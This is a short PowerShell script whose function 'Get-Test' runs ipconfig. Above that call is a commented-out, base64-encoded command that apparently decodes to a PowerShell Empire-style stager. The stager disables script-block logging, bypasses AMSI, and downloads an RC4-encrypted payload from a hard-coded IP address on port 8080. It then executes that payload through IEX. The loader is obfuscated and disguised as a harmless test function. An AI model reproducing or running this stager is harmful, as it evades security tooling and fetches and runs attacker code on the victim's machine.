﻿Function Get-Test

{
#powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBpAG8ATgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJABHAFAAUwA9AFsAcgBFAEYAXQAuAEEAUwBTAEUATQBCAEwAeQAuAEcARQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAFQAVgBBAGwAVQBFACgAJABOAHUATABsACkAOwBJAEYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBsAFMAZQB7AFsAUwBjAHIAaQBwAHQAQgBsAE8AQwBLAF0ALgAiAEcAZQB0AEYASQBlAGAATABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbABVAGUAKAAkAE4AdQBsAEwALAAoAE4AZQB3AC0ATwBiAGoAZQBDAHQAIABDAG8ATABMAEUAQwB0AGkATwBuAHMALgBHAEUAbgBlAFIAaQBjAC4ASABBAHMASABTAEUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AWwBSAGUAZgBdAC4AQQBzAFMARQBNAGIATABZAC4ARwBlAHQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBsAFUAZQAoACQAbgB1AEwATAAsACQAVAByAHUARQApAH0AOwB9ADsAWwBTAHkAcwB0AEUATQAuAE4ARQB0AC4AUwBFAHIAVgBJAEMARQBQAE8AaQBuAFQATQBBAE4AYQBnAGUAUgBdADoAOgBFAHgAcABlAEMAdAAxADAAMABDAG8AbgB0AEkATgBVAGUAPQAwADsAJABXAGMAPQBOAGUAdwAtAE8AYgBqAEUAYwBUACAAUwBZAFMAdABlAE0ALgBOAGUAdAAuAFcARQBCAEMATABJAEUAbgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBjAC4ASABlAEEAZABlAFIAUwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUABSAE8AWABZAD0AWwBTAHkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAEIAUgBlAFEAVQBlAHMAdABdADoAOgBEAGUAZgBBAFUAbAB0AFcAZQBiAFAAUgBvAHgAeQA7ACQAVwBjAC4AUAByAE8AWABZAC4AQwBSAGUARABFAG4AdABJAEEAbABzACAAPQAgAFsAUwB5AHMAVABlAE0ALgBOAEUAVAAuAEMAcgBlAEQAZQBOAHQASQBhAGwAQwBBAGMAaABlAF0AOgA6AEQARQBmAEEAVQBMAFQATgBFAFQAVwBPAFIAawBDAHIARQBEAEUAbgBUAEkAQQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAcwB0AGUATQAuAFQAZQBYAHQALgBFAE4AYwBvAGQASQBOAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAFQAQgBZAHQAZQBTACgAJwB3AD4ARQB1ADUAZABxAF0AQgB5AG4AbABZAEQATgApAGEAbQArAFUAPQBXAH4AWwAuAHgANABJAEMAJQBwACgAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AVQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwA2ADQALgAxADMAMgAuADcANQAuADEANAAyADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAB3AEMALgBIAEUAQQBEAGUAUgBzAC4AQQBEAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBaAFYAOABOAG0AdgBEAFoAWQBTAFkAMQB2AE8ATQBoAC8AWAB6AFoAUwBWAFcAcABqAHkAWQA9ACIAKQA7ACQARABhAFQAYQA9ACQAVwBDAC4ARABvAHcAbgBsAG8AYQBkAEQAYQBUAEEAKAAkAHMARQBSACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAFQAQQBbADAALgAuADMAXQA7ACQAZABBAFQAYQA9ACQARABBAFQAQQBbADQALgAuACQAZABBAFQAYQAuAGwAZQBuAEcAdABoAF0AOwAtAGoAbwBpAE4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
ipconfig
}

Get-Test
